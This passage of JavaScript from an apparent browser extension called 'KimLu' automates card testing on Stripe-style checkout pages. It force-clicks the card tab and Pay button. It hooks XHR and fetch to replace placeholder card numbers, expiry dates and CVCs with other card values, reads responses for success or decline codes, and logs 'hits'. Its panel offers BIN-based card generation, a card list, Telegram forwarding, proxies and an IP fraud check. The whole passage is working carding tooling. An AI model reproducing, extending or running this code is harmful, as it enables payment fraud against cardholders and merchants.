            clickableParent.click();
            return true;
          }

          element.checked = true;
          element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true }));
          element.dispatchEvent(new Event('input', { bubbles: true }));
          element.dispatchEvent(new Event('change', { bubbles: true }));
          return true;
        }

        element.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('mouseup', { bubbles: true, cancelable: true, view: window }));
        element.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
        return true;
      }

      const allLabels = document.querySelectorAll('label, [role="radio"], [role="tab"], [class*="Tab"], [class*="Option"]');
      for (const el of allLabels) {
        const text = (el.textContent || el.innerText || '').trim();
        if (text === 'Card' || text.startsWith('Card ') || text.match(/^Card\s*$/i)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            simulateRealClick(el);
            hasClickedCardTab = true;

            const innerInput = el.querySelector('input[type="radio"]');
            if (innerInput) {
              innerInput.checked = true;
              innerInput.dispatchEvent(new Event('change', { bubbles: true }));
            }
            return true;
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"], input[name*="payment"][value="card"]');
      if (cardInput) {

        const container = cardInput.closest('label') ||
          cardInput.closest('[role="radio"]') ||
          cardInput.closest('[role="tab"]') ||
          cardInput.closest('[class*="Tab"]') ||
          cardInput.closest('[class*="Option"]') ||
          cardInput.closest('[class*="Method"]') ||
          cardInput.closest('div[class]');

        if (container && container !== cardInput) {
          simulateRealClick(container);
        }

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));

        hasClickedCardTab = true;
        return true;
      }

      const cardTabSelectors = [
        '[data-testid="card-tab"]',
        '[data-testid="CARD-tab"]',
        '[data-testid*="card" i]',
        'button[data-value="card"]',
        '[role="tab"][data-value="card"]',
        '[class*="PaymentMethodSelector"] [class*="Tab"]:first-child',
        '[class*="PaymentMethod"] button:first-child',
        '[class*="Tab"][class*="card" i]',
        '.p-TabList button:first-child',
        '[role="tablist"] button:first-child',
        '[role="radiogroup"] > div:first-child',
        '[aria-label*="Card" i]',
      ];

      for (const selector of cardTabSelectors) {
        try {
          const element = document.querySelector(selector);
          if (element) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              simulateRealClick(element);
              hasClickedCardTab = true;
              return true;
            }
          }
        } catch (e) { }
      }

      const paymentArea = document.querySelector('[class*="PaymentMethod"], [class*="payment-method"], [role="radiogroup"]');
      if (paymentArea) {
        const firstRadio = paymentArea.querySelector('input[type="radio"], [role="radio"]');
        if (firstRadio) {
          const container = firstRadio.closest('label') || firstRadio.closest('div') || firstRadio;
          simulateRealClick(container);
          if (firstRadio.tagName === 'INPUT') {
            firstRadio.checked = true;
            firstRadio.dispatchEvent(new Event('change', { bubbles: true }));
          }
          hasClickedCardTab = true;
          return true;
        }
      }

      return false;
    } catch (e) {
      return false;
    }
  }

  function simulateRealTap(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const actualElement = document.elementFromPoint(x, y) || element;

    const eventOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      buttons: 1,
      detail: 1,
      composed: true
    };

    actualElement.dispatchEvent(new MouseEvent('mouseenter', { ...eventOptions, bubbles: false }));
    actualElement.dispatchEvent(new MouseEvent('mouseover', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousemove', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('mousedown', eventOptions));
    actualElement.focus?.();
    actualElement.dispatchEvent(new MouseEvent('mouseup', eventOptions));
    actualElement.dispatchEvent(new MouseEvent('click', eventOptions));

    if (actualElement !== element) {
      element.dispatchEvent(new MouseEvent('click', eventOptions));
    }

    return true;
  }

  function forceClick(element) {
    if (!element) return false;

    const rect = element.getBoundingClientRect();
    const x = rect.left + rect.width / 2;
    const y = rect.top + rect.height / 2;

    const pointerOptions = {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      pointerId: 1,
      pointerType: 'mouse',
      isPrimary: true,
      button: 0,
      buttons: 1,
      composed: true
    };

    element.dispatchEvent(new PointerEvent('pointerover', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerenter', { ...pointerOptions, bubbles: false }));
    element.dispatchEvent(new PointerEvent('pointerdown', pointerOptions));
    element.dispatchEvent(new PointerEvent('pointerup', pointerOptions));

    const clickEvent = new MouseEvent('click', {
      bubbles: true,
      cancelable: true,
      view: window,
      clientX: x,
      clientY: y,
      screenX: x + window.screenX,
      screenY: y + window.screenY,
      button: 0,
      detail: 1,
      composed: true
    });

    element.dispatchEvent(clickEvent);

    element.click?.();

    return true;
  }

  async function openCardDrawer() {
    if (hasClickedCardTab) return;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const isDrawerOpen = () => {

      const allInputs = document.querySelectorAll('input');
      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        const ariaLabel = (input.getAttribute('aria-label') || '').toLowerCase();
        if (placeholder.includes('card number') || placeholder.includes('1234') ||
          ariaLabel.includes('card number') || ariaLabel.includes('credit card')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 10 && rect.width > 50) {
            return true;
          }
        }
      }

      const cardSections = document.querySelectorAll('[class*="CardField"], [class*="cardField"], [class*="CardNumberField"], [class*="card-number"]');
      for (const section of cardSections) {
        const rect = section.getBoundingClientRect();
        if (rect.height > 40 && rect.width > 100) {
          return true;
        }
      }

      const allLabels = document.querySelectorAll('label, span, div');
      for (const label of allLabels) {
        const text = (label.textContent || '').trim().toLowerCase();
        if (text === 'card number' || text === 'card information') {
          const rect = label.getBoundingClientRect();
          if (rect.height > 0 && rect.width > 0) {
            const parent = label.closest('div');
            if (parent) {
              const nearbyInput = parent.querySelector('input, iframe');
              if (nearbyInput) {
                const inputRect = nearbyInput.getBoundingClientRect();
                if (inputRect.height > 10) {
                  return true;
                }
              }
            }
          }
        }
      }

      const cardInput = document.querySelector('input[value="card"]');
      if (cardInput) {
        let container = cardInput.closest('[class*="Option"]') || cardInput.closest('[class*="AccordionItem"]') || cardInput.closest('[role="radio"]')?.parentElement;
        if (container) {
          const rect = container.getBoundingClientRect();
          if (rect.height > 150) {
            return true;
          }
        }
      }

      for (const input of allInputs) {
        const placeholder = (input.placeholder || '').toLowerCase();
        if (placeholder.includes('mm') || placeholder.includes('yy') || placeholder.includes('cvc') || placeholder.includes('cvv')) {
          const rect = input.getBoundingClientRect();
          if (rect.height > 0) {
            return true;
          }
        }
      }

      return false;
    };

    const cardInput = document.querySelector('input[value="card"]');

    if (!cardInput) {
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
      hasClickedCardTab = true;
      return false;
    }

    if (cardInput.checked) {
      await wait(80);
      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }
    }

    const getClickTargets = () => {
      const targets = [];

      const accordionTitle = document.querySelector('[class*="AccordionItemCover-title"]:not([class*="Container"])');
      const accordionTitleContainer = document.querySelector('[class*="AccordionItemCover-titleContai"]');

      const allAccordionTitles = document.querySelectorAll('[class*="AccordionItem"] [class*="title"], [class*="Accordion"] [class*="Title"]');
      for (const title of allAccordionTitles) {
        const text = (title.textContent || '').toLowerCase();
        if (text.includes('card') && !text.includes('gift')) {
          targets.push(title);
        }
      }

      const accordionItem = cardInput.closest('[class*="AccordionItem"]');
      if (accordionItem) {
        const header = accordionItem.querySelector('[class*="Cover"], [class*="Header"], [class*="Title"]');
        if (header) targets.push(header);
        targets.push(accordionItem);
      }

      let parent = cardInput.parentElement;
      for (let i = 0; i < 5 && parent; i++) {
        if (parent.tagName !== 'BODY' && parent.tagName !== 'HTML') {
          if (!targets.includes(parent)) {
            targets.push(parent);
          }
        }
        parent = parent.parentElement;
      }

      const label = cardInput.closest('label');
      const radio = cardInput.closest('[role="radio"]');
      const option = cardInput.closest('[class*="Option"]');

      if (label && !targets.includes(label)) targets.unshift(label);
      if (radio && !targets.includes(radio)) targets.unshift(radio);
      if (option && !targets.includes(option)) targets.unshift(option);

      return targets.filter(t => {
        const r = t.getBoundingClientRect();
        return r.width > 0 && r.height > 0;
      });
    };

    const targets = getClickTargets();

    for (let attempt = 1; attempt <= 3; attempt++) {

      for (let i = 0; i < targets.length; i++) {
        const target = targets[i];
        const tagInfo = `${target.tagName}${target.className ? '.' + String(target.className).split(' ')[0].substring(0, 30) : ''}`;

        forceClick(target);
        await wait(60);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        simulateRealTap(target);
        await wait(60);

        cardInput.checked = true;
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));

        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.click();
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }

        target.scrollIntoView({ behavior: 'instant', block: 'center' });
        await wait(40);
        simulateRealTap(target);
        await wait(120);

        if (isDrawerOpen()) {
          hasClickedCardTab = true;
          return true;
        }
      }

      cardInput.scrollIntoView({ behavior: 'instant', block: 'center' });
      await wait(40);

      simulateRealTap(cardInput);

      try {
        const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'checked').set;
        nativeInputValueSetter.call(cardInput, true);
        cardInput.dispatchEvent(new Event('input', { bubbles: true }));
        cardInput.dispatchEvent(new Event('change', { bubbles: true }));
      } catch (e) { }

      await wait(200);

      if (isDrawerOpen()) {
        hasClickedCardTab = true;
        return true;
      }

      await wait(60);
    }

    hasClickedCardTab = true;
    return false;
  }

  let hasClickedInvoiceCardSection = false;

  async function handleInvoiceAutomation() {
    if (!isInvoiceStripePage()) return;

    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    await wait(300);

    if (!hasClickedInvoiceCardSection) {
      const cardSectionSelectors = [
        '[class*="Card"][class*="Section"]',
        '[class*="PaymentMethod"] [class*="Card"]',
        'button:has-text("Card")',
        'div[role="button"]:has-text("Card")',
        '[class*="Accordion"] [class*="title"]',
        '[class*="payment"] [class*="option"]'
      ];

      const allClickables = document.querySelectorAll('button, [role="button"], [class*="Section"], [class*="Option"], [class*="Method"], label');
      for (const el of allClickables) {
        const text = (el.textContent || '').trim();
        if (text === 'Card' || /^Card$/i.test(text) || (text.includes('Card') && text.length < 20)) {
          const rect = el.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            forceClick(el);
            hasClickedInvoiceCardSection = true;
            await wait(150);
            break;
          }
        }
      }
    }

    const findPayButton = () => {
      const payButtonSelectors = [
        'button[class*="Pay"]',
        'button[type="submit"]',
        '[class*="SubmitButton"]',
        '[class*="PayButton"]',
        'button[data-testid*="pay"]',
        'button[data-testid*="submit"]'
      ];

      for (const selector of payButtonSelectors) {
        const btn = document.querySelector(selector);
        if (btn) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }

      return null;
    };

    window.invoicePayButton = findPayButton();
    if (window.invoicePayButton) {
    }

    return true;
  }

  async function clickInvoicePayButton() {
    const payBtn = window.invoicePayButton || (() => {
      const allButtons = document.querySelectorAll('button');
      for (const btn of allButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if (text === 'pay' || text.startsWith('pay ') || text.includes('pay $') || text.includes('pay ₹')) {
          const rect = btn.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            return btn;
          }
        }
      }
      return null;
    })();

    if (payBtn) {
      forceClick(payBtn);
      return true;
    }

    return false;
  }

  function startAutoSubmit() {
    if (isAutoSubmitting) return
    isAutoSubmitting = true
    successStartTime = Date.now()

    if (isInvoiceStripePage()) {
      handleInvoiceAutomation().then(() => {
        handleAutoSubmit()
      });
    } else {
      openCardDrawer().then(() => {
        handleAutoSubmit()
      });
    }

    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "■ Stop"
      autocoBtn.classList.add("active")
    }
  }
  function stopAutoSubmit() {
    isAutoSubmitting = false
    const autocoBtn = document.getElementById("autocoBtn")
    if (autocoBtn) {
      autocoBtn.textContent = "▶ Start"
      autocoBtn.classList.remove("active")
    }
  }
  const processedResponses = new Set()
  let responseCounter = 0
  let currentCardProcessed = false
  let lastProcessedCard = ""
  let responseReceived = false
  let responseResolve = null
  function waitForResponse(timeout = 15000) {
    return new Promise((resolve) => {
      responseReceived = false
      responseResolve = resolve
      setTimeout(() => {
        if (!responseReceived) {
          responseReceived = true
          if (responseResolve) responseResolve()
        }
      }, timeout)
    })
  }
  function signalResponseReceived() {
    responseReceived = true
    if (responseResolve) {
      responseResolve()
      responseResolve = null
    }
  }
  function processResponseData(json, responseId) {
    if (responseId && processedResponses.has(responseId)) return
    if (responseId) {
      processedResponses.add(responseId)
      setTimeout(() => processedResponses.delete(responseId), 10000)
    }
    const currentCard = window.generatedCardFull || ""
    if (currentCardProcessed && currentCard === lastProcessedCard) {
      return
    }
    function findSuccessStatus(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return false
      if (obj.status === "succeeded") return true
      if (obj.intent_status === "succeeded") return true
      if (obj.paid === true) return true
      if (obj.success === true) return true
      if (obj.approved === true) return true
      if (obj.result === "success") return true
      if (obj.state === "succeeded") return true
      if (obj.payment_status === "paid") return true
      if (obj.charge_status === "succeeded") return true
      if (obj.payment_intent?.status === "succeeded") return true
      if (obj.paymentIntent?.status === "succeeded") return true
      if (obj.charge?.status === "succeeded") return true
      if (obj.charge?.paid === true) return true
      if (obj.transaction?.status === "approved") return true
      if (obj.transaction?.status === "succeeded") return true
      if (obj.data?.status === "succeeded") return true
      if (obj.data?.paid === true) return true
      if (obj.response?.status === "succeeded") return true
      if (obj.payment?.status === "succeeded") return true
      if (obj.payment?.paid === true) return true
      if (Array.isArray(obj.data) && obj.data[0]?.status === "succeeded") return true
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object" && obj[key] !== null) {
          if (findSuccessStatus(obj[key], depth + 1)) return true
        }
      }
      return false
    }
    function findDeclineCode(obj, depth = 0) {
      if (depth > 10 || !obj || typeof obj !== "object") return null
      if (obj.decline_code) return obj.decline_code
      if (obj.error?.decline_code) return obj.error.decline_code
      if (obj.error?.code) return obj.error.code
      if (obj.code && typeof obj.code === "string" && obj.code.includes("_")) return obj.code
      if (obj.failure_code) return obj.failure_code
      if (obj.outcome?.reason) return obj.outcome.reason
      if (obj.outcome?.type === "issuer_declined") return obj.outcome.network_status || "declined"
      for (const key of Object.keys(obj)) {
        if (typeof obj[key] === "object") {
          const found = findDeclineCode(obj[key], depth + 1)
          if (found) return found
        }
      }
      return null
    }
    const isSuccess = findSuccessStatus(json)
    if (isSuccess) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      handleSuccess()
      return
    }
    extractPaymentData(json)
    let declineCode = findDeclineCode(json)
    if (!declineCode) {
      const message = json.error?.message || json.message || json.error_message || ""
      if (message) {
        const msgLower = message.toLowerCase()
        if (msgLower.includes("insufficient funds")) declineCode = "insufficient_funds"
        else if (msgLower.includes("card declined")) declineCode = "card_declined"
        else if (msgLower.includes("expired card")) declineCode = "expired_card"
        else if (msgLower.includes("incorrect cvc")) declineCode = "incorrect_cvc"
        else if (msgLower.includes("incorrect number")) declineCode = "incorrect_number"
        else if (msgLower.includes("invalid cvc")) declineCode = "invalid_cvc"
        else if (msgLower.includes("processing error")) declineCode = "processing_error"
        else if (msgLower.includes("do not honor")) declineCode = "do_not_honor"
        else if (msgLower.includes("lost card")) declineCode = "lost_card"
        else if (msgLower.includes("stolen card")) declineCode = "stolen_card"
        else if (msgLower.includes("fraud")) declineCode = "fraudulent"
        else if (msgLower.includes("invalid account")) declineCode = "invalid_account"
        else if (msgLower.includes("generic decline")) declineCode = "generic_decline"
      }
    }
    if (declineCode && (declineCode.toLowerCase().includes("timeout") || declineCode === "request_timeout")) {
      return
    }
    if (declineCode) {
      currentCardProcessed = true
      lastProcessedCard = currentCard
      signalResponseReceived()
      showWarning("❌ " + declineCode)
      if (window.generatedCardFull) {
        const parts = window.generatedCardFull.split("|")
        addToHistory(parts[0], parts[1], parts[2], parts[3], declineCode)
      }
      const stopCodes = [
        "checkout_not_active_session",
        "checkout_session_expired",
        "payment_intent_unexpected_state",
        "resource_missing",
        "session_expired",
        "expired_session",
        "invalid_session",
      ]
      const declineLower = declineCode.toLowerCase()

      const isSessionExpired = declineLower.includes("session") ||
        (declineLower.includes("expired") && declineLower !== "expired_card")
      if (stopCodes.includes(declineLower) || isSessionExpired) {
        autoStopOnError(declineCode)
      }
    }
  }
  function autoStopOnError(reason) {
    if (isAutoSubmitting) {
      isAutoSubmitting = false
      const autocoBtn = document.getElementById("autocoBtn")
      if (autocoBtn) {
        autocoBtn.textContent = "▶ Start"
        autocoBtn.classList.remove("active")
      }
      showWarning("⛔ Auto-stopped: " + reason, "error")
    }
  }
  const originalXHR = window.XMLHttpRequest
  window.XMLHttpRequest = () => {
    const xhr = new originalXHR()
    const originalOpen = xhr.open
    const originalSend = xhr.send
    const xhrId = ++responseCounter
    xhr.addEventListener("load", function () {
      try {
        if (this.responseText) {
          const json = JSON.parse(this.responseText)
          processResponseData(json, "xhr_" + xhrId)
        }
      } catch (e) { }
    })
    xhr.addEventListener("error", () => { })
    xhr.addEventListener("timeout", () => { })
    xhr.open = function (method, url) {
      if (url && typeof url === "string" && realCardValues.cardNumber) {
        if (url.includes("card[number]=0000000000000000")) {
          url = url.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (url.includes("card[exp_month]=01") && url.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          url = url.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          url = url.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (url.includes("card[cvc]=000")) {
          url = url.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalOpen.apply(xhr, arguments)
    }
    xhr.send = function (body) {
      if (body && typeof body === "string" && realCardValues.cardNumber) {
        if (body.includes("card[number]=0000000000000000")) {
          body = body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
        }
        if (body.includes("card[exp_month]=01") && body.includes("card[exp_year]=30")) {
          const parts = realCardValues.cardExpiry.split("/")
          body = body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
          body = body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
        }
        if (body.includes("card[cvc]=000")) {
          body = body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
        }
      }
      return originalSend.apply(xhr, [body])
    }
    return xhr
  }
  const originalFetch = window.fetch
  window.fetch = async function (input, init) {
    if (init && init.body && typeof init.body === "string" && realCardValues.cardNumber) {
      if (init.body.includes("card[number]=0000000000000000")) {
        init.body = init.body.replace("card[number]=0000000000000000", "card[number]=" + realCardValues.cardNumber)
      }
      if (init.body.includes("card[exp_month]=01") && init.body.includes("card[exp_year]=30")) {
        const parts = realCardValues.cardExpiry.split("/")
        init.body = init.body.replace("card[exp_month]=01", "card[exp_month]=" + parts[0])
        init.body = init.body.replace("card[exp_year]=30", "card[exp_year]=" + parts[1])
      }
      if (init.body.includes("card[cvc]=000")) {
        init.body = init.body.replace("card[cvc]=000", "card[cvc]=" + realCardValues.cardCvc)
      }
    }
    const fetchId = "fetch_" + ++responseCounter
    try {
      const response = await originalFetch.apply(this, [input, init])
      const url = typeof input === "string" ? input : input?.url || ""
      const contentType = response.headers?.get("content-type") || ""
      if (contentType.includes("application/json")) {
        try {
          const cloned = response.clone()
          const text = await cloned.text()
          if (text) {
            const json = JSON.parse(text)
            processResponseData(json, fetchId)
          }
        } catch (e) { }
      }
      return response
    } catch (fetchError) {
      throw fetchError
    }
  }
  async function createOverlay() {
    if (isCreatingOverlay) return
    isCreatingOverlay = true
    const key = "cardGeneratorHit_" + window.location.href

    // ============= PARALLEL: Hit check + License check + Load all data =============
    // Run all three independent tasks simultaneously for faster startup
    let savedToken = "";

    const hitCheckPromise = new Promise(resolve => {
      if (window.kimtimStorage && window.kimtimStorage.loadAllData) {
        window.kimtimStorage.loadAllData((data) => {
          resolve(data[key] === "true" || data[key] === true);
        });
      } else {
        resolve(localStorage.getItem(key) === "true");
      }
    });

    const licensePromise = checkLicenseKey();

    const dataLoadPromise = new Promise((resolve) => {
      if (window.kimtimStorage && window.kimtimStorage.loadAllData) {
        window.kimtimStorage.loadAllData((data) => {

          // Load saved BINs
          if (data[K.SAVED_BINS] && Array.isArray(data[K.SAVED_BINS])) {
            savedBINs = data[K.SAVED_BINS];
          }

          // Load user session
          if (data[K.TOKEN]) {
            savedToken = data[K.TOKEN];
            userId = data[K.USER_ID] || "";
            userFirstName = data[K.FIRST_NAME] || "";
            savedId = userId;

            // Sync to localStorage for backwards compatibility
            localStorage.setItem(K.TOKEN, savedToken);
            localStorage.setItem(K.USER_ID, userId);
            localStorage.setItem(K.FIRST_NAME, userFirstName);
          }

          // Load toggle states
          if (data[K.TOGGLE_TG_FORWARD] !== undefined) {
            tgForwardEnabled = data[K.TOGGLE_TG_FORWARD] !== false;
          }

          // Load custom name/email
          if (data[K.CUSTOM_NAME]) {
            customName = data[K.CUSTOM_NAME];
            localStorage.setItem(K.CUSTOM_NAME, customName);
          }
          if (data[K.CUSTOM_EMAIL]) {
            customEmail = data[K.CUSTOM_EMAIL];
            localStorage.setItem(K.CUSTOM_EMAIL, customEmail);
          }

          // Load saved ID
          if (data[K.SAVED_ID]) {
            savedId = data[K.SAVED_ID];
            localStorage.setItem(K.USER_ID, savedId);
          }

          resolve();
        });
      } else {
        // Fallback to localStorage if storage module not loaded
        const storedBins = localStorage.getItem(K.SAVED_BINS)
        if (storedBins) {
          try {
            savedBINs = JSON.parse(storedBins)
          } catch (e) { }
        }
        if (savedBINs.length === 0) {
          const oldBin = localStorage.getItem(K.SAVED_BINS)
          if (oldBin) savedBINs = [oldBin]
        }
        savedId = localStorage.getItem(K.USER_ID) || ""
        userId = localStorage.getItem(K.USER_ID) || ""
        userFirstName = localStorage.getItem(K.FIRST_NAME) || ""
        savedToken = localStorage.getItem(K.TOKEN) || ""
        resolve();
      }
    });

    // Wait for all three to finish simultaneously
    const [hitStatus, isValidLicense] = await Promise.all([hitCheckPromise, licensePromise, dataLoadPromise]);

    if (hitStatus) {
      hasHit = true
      hasNotified = true
      isCreatingOverlay = false
      return
    }
    if (document.querySelector(".card-generator-overlay")) {
      isCreatingOverlay = false
      return
    }

    // ============= CHECK LICENSE RESULT =============
    if (!isValidLicense) {
      showInvalidLicensePage();
      isCreatingOverlay = false;
      return;
    }

    if (isVersionOutdated) {
      showUpdatePage("outdated");
      isCreatingOverlay = false;
      return;
    }

    // Also check localStorage if no token in synced storage
    if (!savedToken) {
      savedToken = localStorage.getItem(K.TOKEN) || "";
    }

    // ============= STEP 3: VALIDATE TOKEN BEFORE SHOWING DASHBOARD =============
    isLoggedIn = true; // Direct access enabled

    if (savedToken && savedToken.length === 15) {
      const restoreResult = await validateToken(savedToken);
      const isTokenValid = restoreResult && restoreResult.success;

      if (isTokenValid) {
        isLoggedIn = true;
        userId = restoreResult.userId || userId;
        userFirstName = restoreResult.firstName || userFirstName;
        userPfpUrl = restoreResult.pfpUrl || userPfpUrl || DEFAULT_PFP;
        userHitsCount = restoreResult.userHits ?? restoreResult.hits ?? 0;
        globalHitsCount = restoreResult.globalHits ?? globalHitsCount;
        userAttemptsCount = restoreResult.attempts || 0;
        savedId = userId;
        // Also refresh from hit_counts.json as a safety net
        await Promise.race([fetchHitCounts(), new Promise(r => setTimeout(r, 2000))]);
        startHitCountsRefresh();

        window.postMessage({
          type: "SAVE_LOGIN_STATE",
          token: savedToken,
          userId: userId,
          firstName: userFirstName,
        }, "*");
      } else {
        // Clear invalid token
        userId = "";
        userFirstName = "";
        isLoggedIn = false;
        savedToken = "";

        localStorage.removeItem(K.TOKEN);
        localStorage.removeItem(K.USER_ID);
        localStorage.removeItem(K.FIRST_NAME);

        if (window.kimtimStorage && window.kimtimStorage.clearUserSession) {
          window.kimtimStorage.clearUserSession();
        }

        window.postMessage({ type: "SAVE_LOGIN_STATE", token: null }, "*");
      }
    } else {
      isLoggedIn = false;
    }

    // ============= STEP 4: CREATE OVERLAY WITH CORRECT STATE =============

    if (tgForwardEnabled === undefined) {
      tgForwardEnabled = localStorage.getItem(K.TOGGLE_TG_FORWARD) !== "false"
    }
    cardFieldsDetected = hasCardFields()
    const overlay = document.createElement("div")
    overlay.className = "card-generator-overlay"
    overlay.innerHTML = `
    <div class="panel-header">
      <div class="panel-header-content">
        ${DEFAULT_PFP ? `<img src="${DEFAULT_PFP}">` : '💳 '}
        <span class="panel-title">KimLu</span>
      </div>
      <div class="header-controls">
        <button class="music-toggle" id="musicToggleBtn" title="Toggle Music">🎵</button>
        <button class="minimize-btn" id="minimizeBtn" title="Minimize panel">»</button>
      </div>
    </div>
    <div class="modal-content" id="mainDashboard">
      <div class="section">
        <div class="section-title">MODE</div>
        <div class="mode-toggle mode-toggle-small">
          <button class="mode-btn active" id="modeBin" data-mode="bin">BIN</button>
          <button class="mode-btn" id="modeCc" data-mode="cc">CC</button>
        </div>
      </div>
      <div class="section" id="binSection">
        <div class="section-title">BIN</div>
        <div class="bin-inputs-container" id="binInputsContainer">
          <div class="bin-input-row">
            <input type="text" class="input-field bin-input" id="binInput1" placeholder="input bin" maxlength="30">
            <button class="add-bin-btn" id="addBinBtn" title="Add BIN">+</button>
          </div>
        </div>
        <div class="bin-buttons-row">
          <button class="action-btn save-btn" id="enterBinBtn">💾 Save</button>
          <button class="action-btn switch-btn hidden" id="switchBinBtn">🔄 Switch</button>
        </div>
        <div class="bin-library-row">
          <button class="action-btn library-btn" id="binLibraryBtn">📖 Library</button>
        </div>
      </div>
      <div class="section hidden" id="ccSection">
        <div class="section-title">CC LIST</div>
        <div class="cc-info">${ccList.length} cards loaded</div>
        <button class="action-btn save-btn" id="openCcModal">📝 Edit CC List</button>
      </div>
      <div class="section-divider"></div>
      <div class="section">
        <button class="action-btn primary-btn" id="autocoBtn">▶ Start</button>
      </div>
      <div class="section-divider"></div>
      <div class="collapsible-section">
        <div class="collapsible-header" id="statsToggle">
          <span>📋 Logs</span>
          <span class="collapse-icon">▼</span>
        </div>
        <div class="collapsible-content" id="statsContent">
          <div class="history-list" id="historyList">
            <div class="history-empty">No logs yet</div>
          </div>
          <button class="action-btn clear-btn" id="clearHistory">🗑 Clear Logs</button>
        </div>
      </div>
      <div class="collapsible-section">
        <div class="collapsible-header" id="settingsToggle">
          <span>⚙️ Settings</span>
          <span class="collapse-icon">▼</span>
        </div>
        <div class="collapsible-content" id="settingsContent">
          <div class="settings-grid">
            <div class="setting-row">
              <span class="setting-icon tg-config-icon">FW</span>
              <span class="setting-label">TG Forward</span>
              <label class="toggle-switch">
                <input type="checkbox" id="tgForwardToggle" ${tgForwardEnabled ? "checked" : ""}>
                <span class="toggle-slider"></span>
              </label>
            </div>
  <div class="setting-row proxy-row-compact tg-config-row">
  <div class="tg-config-meta">
  <span class="setting-icon tg-config-icon">TG</span>
  <div class="tg-config-copy">
  <span class="setting-label tg-config-title">Telegram Bot</span>
  <span class="tg-config-subtitle">Token and chat ID</span>
  </div>
  </div>
  <button class="kimlu-tg-forward-open-btn" id="tgConfigOpenBtn">Open</button>
  </div>
  <div class="setting-row">
  <span class="setting-icon">👤</span>
  <span class="setting-label">Name</span>
  <input type="text" class="setting-text-input" id="customNameInput" placeholder="Optional" value="${customName}">
  </div>
  <div class="setting-row">
  <span class="setting-icon">📧</span>
  <span class="setting-label">Email</span>
  <input type="text" class="setting-text-input" id="customEmailInput" placeholder="Optional" value="${customEmail}">
  </div>
  <div class="setting-row proxy-row-compact">
    <span class="setting-icon">🌐</span>
    <span class="setting-label">Proxy</span>
    <button class="proxy-view-btn-small" id="proxyViewBtn">${proxyString ? "View" : "Set"}</button>
  </div>
  <div class="setting-row proxy-row-compact">
    <span class="setting-icon">IP</span>
    <span class="setting-label">IP Fraud</span>
    <button class="ipfraud-btn-small" id="ipFraudBtn">Check</button>
  </div>
  <div class="setting-box" id="bgColorBox">
    <div class="setting-row no-border">
      <span class="setting-icon">🎨</span>
      <span class="setting-label">BG Color</span>
      <label class="toggle-switch">
        <input type="checkbox" id="bgColorToggle" ${bgColorEnabled ? "checked" : ""}>
        <span class="toggle-slider"></span>
      </label>
    </div>
    <div class="setting-row-inner ${bgColorEnabled ? "" : "hidden"}" id="colorSettingsBox">
      <span class="setting-label-inner">Pick Color</span>
      <input type="color" class="custom-color-box" id="pageBgColorInput" value="${pageBackgroundColor}">
    </div>
  </div>
  <div class="setting-box" id="musicBox">
    <div class="setting-row no-border">
      <span class="setting-icon">🎵</span>
      <span class="setting-label">Custom Music</span>
    </div>
    <div class="setting-row-inner">
      <button class="music-btn" id="customMusicBtn">📁 Upload</button>
